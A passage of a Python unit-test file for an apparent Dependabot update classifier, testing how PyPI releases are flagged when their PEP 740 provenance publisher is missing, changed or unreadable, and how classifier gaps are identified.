                pages[integrity(name)] = {
                    "version": 1,
                    "attestation_bundles": [{"publisher": chosen}],
                }
        return Registry(pages)

    def test_a_pypi_release_keeps_its_pep_740_publisher_or_is_review(self) -> None:
        numpy = [dependabot.Update("numpy", False, "2.3.5")]
        self.assertEqual(reasons(numpy, "pip", self.pypi()), [])
        self.assertEqual(
            reasons(numpy, "pip", self.pypi(missing=True)), ["provenance-missing:numpy"]
        )
        moved = {
            "kind": "GitHub",
            "repository": "someone/numpy",
            "workflow": "wheels.yml",
        }
        self.assertEqual(
            reasons(numpy, "pip", self.pypi(moved)), ["provenance-changed:numpy"]
        )
        self.assertEqual(
            reasons([dependabot.Update("numpy", False, "9.9.9")], "pip", self.pypi()),
            ["provenance-unreadable:numpy"],
        )
        self.assertEqual(
            reasons(numpy, "pip", Registry({})), ["provenance-unreadable:numpy"]
        )

    def test_github_actions_is_not_read(self) -> None:
        get = Registry({})
        self.assertEqual(
            reasons(npm("actions/checkout", "4.2.0"), "github_actions", get), []
        )
        self.assertEqual(get.calls, [])

    def test_the_parsed_updates_carry_the_new_version(self) -> None:
        titled = dependabot.classify("bump x from 1.2.0 to 1.3.0", "", NPM, "success")
        self.assertEqual(titled.updates[0].version, "1.3.0")
        listed = dependabot.classify(
            "bump x",
            "",
            NPM,
            "success",
            [commit(metadata(("x", "semver-minor", "1.3.0")))],
        )
        self.assertEqual(listed.updates[0].version, "1.3.0")

    def test_only_a_parse_gap_is_a_classifier_gap(self) -> None:
        gaps = dependabot.classifier_gaps
        self.assertEqual(gaps(["unparsed-updates"]), ("unparsed-updates",))
        self.assertEqual(
            gaps(["sources-disagree", "provenance-unreadable:x"]),
            ("sources-disagree", "provenance-unreadable:x"),
        )
        for reason in ("dependabot-config-unreadable", "dependabot-policy-unreadable"):
            self.assertEqual(gaps([reason]), (reason,))
        self.assertEqual(gaps(["provenance-unreadable:x", "major:y"]), ())
        self.assertEqual(gaps(["provenance-changed:x"]), ())
        self.assertEqual(gaps([]), ())


if __name__ == "__main__":
    unittest.main()
